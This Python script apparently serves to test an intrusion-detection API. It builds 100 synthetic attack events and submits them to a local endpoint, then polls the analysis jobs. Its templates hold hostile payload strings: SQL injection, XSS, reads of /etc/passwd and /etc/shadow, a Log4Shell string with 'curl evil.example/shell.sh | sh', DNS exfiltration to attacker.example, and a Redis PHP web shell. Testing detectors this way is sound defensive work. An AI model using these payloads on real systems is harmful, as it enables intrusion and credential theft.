#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parent
DEFAULT_ATTACKS_FILE = ROOT / "attack_requests_100.json"
DEFAULT_API_BASE = "http://127.0.0.1:8001"


ATTACK_TEMPLATES = [
    {
        "name": "sql_injection",
        "service": "http",
        "dst_port": 80,
        "body": "' OR '1'='1' UNION SELECT username,password FROM users--",
    },
    {
        "name": "xss",
        "service": "http",
        "dst_port": 8080,
        "body": "<script>fetch('/admin/session').then(r=>r.text())</script>",
    },
    {
        "name": "command_injection",
        "service": "http",
        "dst_port": 80,
        "body": "status=ok; cat /etc/passwd; uname -a",
    },
    {
        "name": "path_traversal",
        "service": "http",
        "dst_port": 8080,
        "body": "GET /download?file=../../../../etc/shadow HTTP/1.1",
    },
    {
        "name": "ssh_bruteforce",
        "service": "ssh",
        "dst_port": 22,
        "body": "Failed password for root from attacker repeated login attempts",
    },
    {
        "name": "dns_tunnel",
        "service": "dns",
        "dst_port": 53,
        "body": "very-long-exfiltration-subdomain-encoded-data.attacker.example",
    },
    {
        "name": "ddos_http_flood",
        "service": "http",
        "dst_port": 80,
        "body": "GET /login HTTP/1.1 flood high-rate repeated requests",
    },
    {
        "name": "rce_payload",
        "service": "http",
        "dst_port": 443,
        "body": "${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh",
    },
    {
        "name": "mongodb_probe",
        "service": "mongodb",
        "dst_port": 27017,
        "body": "db.adminCommand({listDatabases:1}); unauthorized scan",
    },
    {
        "name": "redis_abuse",
        "service": "redis",
        "dst_port": 6379,
        "body": "CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'",
    },
]


def build_attacks(count: int = 100) -> list[dict[str, Any]]:
    attacks: list[dict[str, Any]] = []
    now = datetime.now(timezone.utc).isoformat()
    for index in range(count):
        template = ATTACK_TEMPLATES[index % len(ATTACK_TEMPLATES)]
        src_host = 10 + index
        dst_host = 20 + (index % 30)
        src_bytes = 600 + (index * 37)
        dst_bytes = 80 + (index * 11)
        http_body_len = len(template["body"]) if template["service"] == "http" else 0
        attack_id = f"attack-{index + 1:03d}-{template['name']}"
        attacks.append(
            {
                "_id": attack_id,
                "src_ip": f"198.51.100.{src_host % 250}",
                "dst_ip": f"10.0.0.{dst_host}",
                "src_port": 20000 + index,
                "dst_port": template["dst_port"],
                "proto": "udp" if template["service"] == "dns" else "tcp",
                "service": template["service"],
                "conn_state": "S0" if template["name"] == "ddos_http_flood" else "SF",
                "duration": round(0.02 + (index % 12) * 0.13, 3),
                "src_bytes": src_bytes,
                "dst_bytes": dst_bytes,
                "missed_bytes": 0,
                "src_pkts": 5 + (index % 40),
                "src_ip_bytes": src_bytes + 120,
                "dst_pkts": 1 + (index % 8),
                "dst_ip_bytes": dst_bytes + 80,
                "dns_qclass": 1 if template["service"] == "dns" else 0,
                "dns_qtype": 16 if template["service"] == "dns" else 0,
                "dns_rcode": 0,
                "http_trans_depth": 1 if template["service"] == "http" else 0,
                "http_request_body_len": http_body_len,
                "http_response_body_len": 0,
                "http_status_code": 200 if template["service"] == "http" else 0,
                "timestamp": now,
                "raw_log": (
                    f"{attack_id} {template['name']} from 198.51.100.{src_host % 250} "
                    f"to 10.0.0.{dst_host}:{template['dst_port']} payload={template['body']}"
                ),
            }
        )
    return attacks


def write_attacks(path: Path, count: int) -> list[dict[str, Any]]:
    attacks = build_attacks(count)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(attacks, indent=2) + "\n", encoding="utf-8")
    return attacks


def request_json(method: str, url: str, payload: dict[str, Any] | None = None) -> Any:
    data = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(request, timeout=20) as response:
        return json.loads(response.read().decode("utf-8"))


def queue_attacks(api_base: str, attacks: list[dict[str, Any]], delay: float) -> list[str]:
    job_ids: list[str] = []
    endpoint = f"{api_base.rstrip('/')}/api/analysis/jobs"
    for index, attack in enumerate(attacks, start=1):
        try:
            result = request_json("POST", endpoint, attack)
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")
            print(f"[{index:03d}] HTTP {exc.code}: {detail}", file=sys.stderr)
            continue
        job_ids.append(result["id"])
        print(
            f"[{index:03d}] queued {attack['_id']} -> {result['id']} "
            f"({result['status']}, position={result.get('queue_position')})"
        )
        if delay:
            time.sleep(delay)
    return job_ids


def poll_jobs(api_base: str, job_ids: list[str], wait_seconds: int) -> None:
    if not job_ids or wait_seconds <= 0:
        return

    endpoint = f"{api_base.rstrip('/')}/api/analysis/jobs?limit=500"
    deadline = time.monotonic() + wait_seconds
    terminal = {"completed", "failed", "cancelled"}
    last_line = ""

    while time.monotonic() < deadline:
        jobs = request_json("GET", endpoint)
        relevant = [job for job in jobs if job["id"] in job_ids]
        counts: dict[str, int] = {}
        for job in relevant:
            counts[job["status"]] = counts.get(job["status"], 0) + 1
        line = " | ".join(f"{status}={counts.get(status, 0)}" for status in [
            "waiting",
            "processing",
            "completed",
            "failed",
            "cancelled",
        ])
        if line != last_line:
            print(f"status: {line}")
            last_line = line
        if len(relevant) == len(job_ids) and all(job["status"] in terminal for job in relevant):
            break
        time.sleep(2)

    jobs = request_json("GET", endpoint)
    relevant = [job for job in jobs if job["id"] in job_ids]
    failed = [job for job in relevant if job["status"] == "failed"]
    print(f"final: tracked={len(relevant)}/{len(job_ids)} failed={len(failed)}")
    for job in failed[:5]:
        print(f"failed {job['id']}: {job.get('error')}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate and submit 100 attack events to IDS-AI.")
    parser.add_argument("--api-base", default=DEFAULT_API_BASE)
    parser.add_argument("--file", default=str(DEFAULT_ATTACKS_FILE))
    parser.add_argument("--count", type=int, default=100)
    parser.add_argument("--delay", type=float, default=0.0)
    parser.add_argument("--wait-seconds", type=int, default=60)
    parser.add_argument("--generate-only", action="store_true")
    args = parser.parse_args()

    attacks_file = Path(args.file)
    attacks = write_attacks(attacks_file, args.count)
    print(f"wrote {len(attacks)} attacks to {attacks_file}")

    if args.generate_only:
        return 0

    health = request_json("GET", f"{args.api_base.rstrip('/')}/api/health")
    print(
        "api: "
        f"status={health.get('status')} "
        f"queue={health.get('analysis_queue_size')}/"
        f"{health.get('analysis_queue_capacity')} "
        f"concurrency={health.get('analysis_concurrency')}"
    )

    job_ids = queue_attacks(args.api_base, attacks, args.delay)
    print(f"queued jobs: {len(job_ids)}/{len(attacks)}")
    poll_jobs(args.api_base, job_ids, args.wait_seconds)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
